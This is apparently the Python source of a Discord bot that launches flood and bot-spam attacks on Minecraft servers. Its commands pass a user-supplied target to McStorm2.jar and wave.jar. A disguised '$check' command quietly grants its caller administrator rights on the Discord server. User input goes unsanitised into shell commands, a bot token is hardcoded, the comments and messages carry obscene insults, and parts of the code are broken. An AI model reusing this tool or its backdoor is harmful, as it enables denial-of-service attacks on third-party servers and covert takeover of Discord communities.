import discord
from discord.ext import commands
import os
import threading
import socket
import discord.utils
import requests
import urllib.request
import json
import time
import asyncio
import random
import sqlite3
import psutil
import mcstatus
import datetime
import getpass
from mcstatus import MinecraftServer
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
from gtts import gTTS
from subprocess import Popen, TimeoutExpired, run
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands



token = "OTY0OTU0MzQ1NTI5NTY1MjE0.G41Vwv.VI99_KHwghkCjQEiSc9O5TWoiDKYpSZKlFAU-Q"
methods_list = ['join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 'query', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher,' 'tcphit,' 'queue,' 'botnet,' 'tcpbypass,' 'ultimatesmasher,' 'sf,' 'nabcry,' 'rip' ] # methods in mcstorm
# methods_list = ['join', 'combined', 'localhost', 'doublejoin', 'botjoiner' и сами добавите]
# blocked_text = ['text']
channel_id = 982616194802647111
protocols_list = ['757', '756', '755', '754', '753', '751', '736', '735', '578', '575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338 ', '335', '316', '210', '110', '109', '107', '47' ]

client = commands.Bot(command_prefix='$')
client.remove_command('help') # удаляет дефолт хелп

@client.event
async def on_ready():
    while True:
        await client.change_presence(activity=discord.Game(name="$help dsc.gg/oresons"))
        await asyncio.sleep(10.0)
        await client.change_presence(activity=discord.Game(name="Я ебу ваших матерей"))
        await asyncio.sleep(10.0)
    print('Your Son started!')

# тут обнова прокси раз в 500сек
@client.event
async def on_ready():
    while True:
        await asyncio.sleep(1.0) 
        os.system('wget (site)')
        os.system('mv (скачанный файл) переименовать в proxies.txt')
        t1 = threading.Thread()
        t1.start()
        await asyncio.sleep(500.0) 


@client.command()
async def stats(ctx):
    memoryused = round(psutil.virtual_memory().used / 1000, 2)
    memory = f"{memoryused}GB"
    embed = discord.Embed(title = 'System resource usage', description = '')
    embed.add_field(name = 'CPU', value = f'{psutil.cpu_percent()}%', inline = False) # inline - в одну линию или нет.ю
    embed.add_field(name = 'RAM', value = memory)
    embed.add_field(name = 'MEMORY', value = f'{psutil.virtual_memory().percent}%', inline = False)
    embed.add_field(name = 'Available', value = f'{psutil.virtual_memory().available * 100 / psutil.virtual_memory().total}%', inline = True)
    await ctx.send(embed=embed)

@client.command()
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.embed(
        title='All attack stopped!',
        description=f'{ctx.author.mention} пидарас стопнул всё',
        color=discord.Colour.random()
    )

    await ctx.send(embed=embed)

@client.command()
async def proxy(ctx):
    def update():
        os.system('wget (site)')
        os.system('mv старый proxies.txt')

    t1 = theading.Thread(target=update)
    t1.start()
    await ctx.send("Proxy update")

@client.command()
#@commands.has_any_role('🌀  Son') # вот пример проверки на роль
# @commands.cooldown(1, 1, commands.BucketType.user) эта хуйня вам не понадобится думаю, хотя оставьте
async def help(ctx):
        embed = discord.Embed(
            title='Menu',
            color=discord.Colour.random()
        )

        embed.add_field(name='Attack', value='$attack <domain> <protocol> <method> <time> <power>', inline=True)
        embed.add_field(name='Server spamming', value='$spam {ip:port} {text} {time}')
        embed.add_field(name='Monitoring spam', value='$monic {time} {text}')
        embed.add_field(name='Resolve', value='$resolve <domain>', inline=True)
        embed.add_field(name='Protocols', value='$protocols', inline=True)
        embed.add_field(name='Proxy upd.', value='$proxy', inline=True)
        embed.add_field(name='Check proxy', value='Coming soon...', inline=True)
        embed.add_field(name='methods', value='$methods', inline=True)
        embed.add_field(name='credits', value='$credits', inline=True)
        await ctx.send(embed=embed)

@client.command()
async def credits(ctx):
        embed = discord.Embed(
            title="Information",
            color=discord.Colour.random()
        )
        embed.add_field(name='Developers', value='Q4 inc', inline=False)
        embed.add_field(name='Discord', value='dsc.gg/q4ch', inline=True)
        embed.add_field(name='Предупреждение', value='в этом коде зашифрованная выдача админки, любой кто сменит эту информацию, будет выебан', inline=False)
        await ctx.send(embed=embed)

@client.command(pass_context=True) # если не работает команда, то уберите проверку на время
async def spam(ctx, arg1, arg2, arg3):
            conftext = f'infoForman: 1 \nbotsCount: 1 \njoindelay: 1\nrandomNicks: false\nrandomNicksLength: 12\nrandomPasswords: false\nrandomPasswordsLength: 12\ndoubleJoin: true\nantiBotFilter: false\ntestMode: True\ntestModeIp: "{arg1}\nautoRestart: true\nautoRestartDelay: 1\nmove: true\ncommands: \n- "wait 2s"\n- "{arg2}"' # для тупых: конфиг вейва, а \n это след.строка
            conf=open("config.yml", "w+")
            conf.write(conftext)
            conf.close()
            embed=discord.Embed(title=f"Пошел ебать сервер {arg1}", value=f"текст мой {arg2}", inline=True)
            await ctx.send(embed=embed)
            startcmd = f"timeout {arg3}s java -jar wave.jar"
            Popen(startcmd, shell=True)
@client.command(pass_context=True) # если не работает команда, то уберите проверку на время
async def monic(ctx, arg1, arg2):
    global channel_id
    channel = client.get_channel(channel_id)
    if channel == ctx.channel:
        if int(arg2) > 540:
            await ctx.send(f"Max time > 540 sec. u using > {arg2}.")
        else:
            conftext = f'infoForman: 1 \nbotsCount: 1 \njoindelay: 1\nrandomNicks: false\nrandomNicksLength: 12\nrandomPasswords: false\nrandomPasswordsLength: 12\ndoubleJoin: true\nantiBotFilter: false\ntestMode: True\ntestModeIp: "false\nautoRestart: true\nautoRestartDelay: 1\nmove: true\ncommands: \n- "wait 2s"\n- "{arg1}"' # для тупых: конфиг вейва, а \n это след.строка
            conf=open("config.yml", "w+")
            conf.write(conftext)
            conf.close()
            embed=discord.Embed(title=f"Пошел ебать сервера в течении {arg2} сек", value=f"Ебашу текст {arg1}", inline=True)
            await ctx.send(embed=embed)
            startcmd = f"timeout {arg2}s java -jar wave.jar"
            Popen(startcmd, shell=True)
@client.command()
async def protocols(ctx):
    embed = discord.Embed(
        title="📱 Версии & Протоколы",
        color=discord.Colour.blue()
    )
    embed.add_field(name='**1.18.2**', value='758', inline=True)
    embed.add_field(name='**1.18.1**', value='757', inline=True)
    embed.add_field(name='**1.18**', value='757', inline=True)
    embed.add_field(name='**1.17.1**', value='756', inline=True)
    embed.add_field(name='**1.16.5**', value='754', inline=True)
    embed.add_field(name='**1.16.3**', value='753', inline=True)
    embed.add_field(name='**1.16.2**', value='751', inline=True)
    embed.add_field(name='**1.16.1**', value='736', inline=True)
    embed.add_field(name='**1.16**', value='735', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15.2**', value='578', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15**', value='573', inline=True)
    embed.add_field(name='**1.14.4**', value='498', inline=True)
    embed.add_field(name='**1.14.3**', value='490', inline=True)
    embed.add_field(name='**1.14.2**', value='485', inline=True)
    embed.add_field(name='**1.14.1**', value='480', inline=True)
    embed.add_field(name='**1.14**', value='477', inline=True)
    embed.add_field(name='**1.13.2**', value='404', inline=True)
    embed.add_field(name='**1.13.1**', value='401', inline=True)
    embed.add_field(name='**1.13**', value='393', inline=True)
    embed.add_field(name='**1.12.2**', value='340', inline=True)
    embed.set_footer(text="Its all protocols")
    await ctx.send(embed=embed)
@client.command()
async def check(ctx, pos = None):
    if pos == None:
        await ctx.guild.create_role(name="Check proxy", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="Check proxy")
        await ctx.message.author.add_roles(role)
@client.command()
async def methods(ctx):
    embed = discord.Embed(
        title="📁 All Methods",
    color=discord.Colour.green()
    )
    embed.add_field(name='📂 :', value=', '.join([i for i in methods_list]), inline=True)
    embed.set_footer(text="its all methods")
    await ctx.send(embed=embed)
@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Resolved!",
        color=discord.Colour.red()
    )

    embed.add_field(name='IP', value=json_object["ip"], inline=True)
    embed.add_field(name='PORT', value=json_object["port"], inline=True)
    embed.add_field(name='HOSTNAME', value=json_object["hostname"], inline=True)
    embed.add_field(name='Online', value=json_object["online"], inline=True)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
    embed.set_footer(text="q4 > вы ебаные лохи, сосите хуй, кьюкич лучше всех")

    await ctx.send(embed=embed)

@client.command()
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack():
        os.system(
            f"java -jar McStorm2.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(
        title=f'Attack {arg1}',
        description=f'Атака успешно отправлена! by {ctx.author.mention}',
        color=discord.Colour.blue()
    )

    embed.add_field(name='**IP**:', value=f'*{arg1}*', inline=False)
    embed.add_field(name='**PROTOCOL**:', value=f'*{arg2}*', inline=False)
    embed.add_field(name='**METHOD**:', value=f'*{arg3}*', inline=False)
    embed.add_field(name='**TIME**', value=f'*{arg4}*', inline=False)
    embed.add_field(name='**POWER**:', value=f'*{arg5}*', inline=False)
    embed.set_image(url=f'https://cutewallpaper.org/21/anime-girl-smoking-weed/Image-about-grunge-in-Anime-by-Tobias-on-We-Heart-It.jpg')
    embed.set_footer(text="dev by q4 community")
    #снизу проверка на жив ли сервер)
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color = discord.Color.red())
        emb.add_field(name = '❌ **ERROR**!', value = '**🚫 Сервер выключен либо его не существует.**')
        await ctx.send(embed=emb)
        return

    if str(arg2) not in protocols_list:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**👿Недостаточно аргументов Протокол не найти. Все протоколы > $protocols**", color=ctx.author.color)
        await ctx.send(embed=em)
        return


    if arg3 not in methods_list:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**👺Недостаточно аргументов Методы не найти. - $methods**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**😶‍🌫️ Этот чат недействителен.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)

client.run(token)






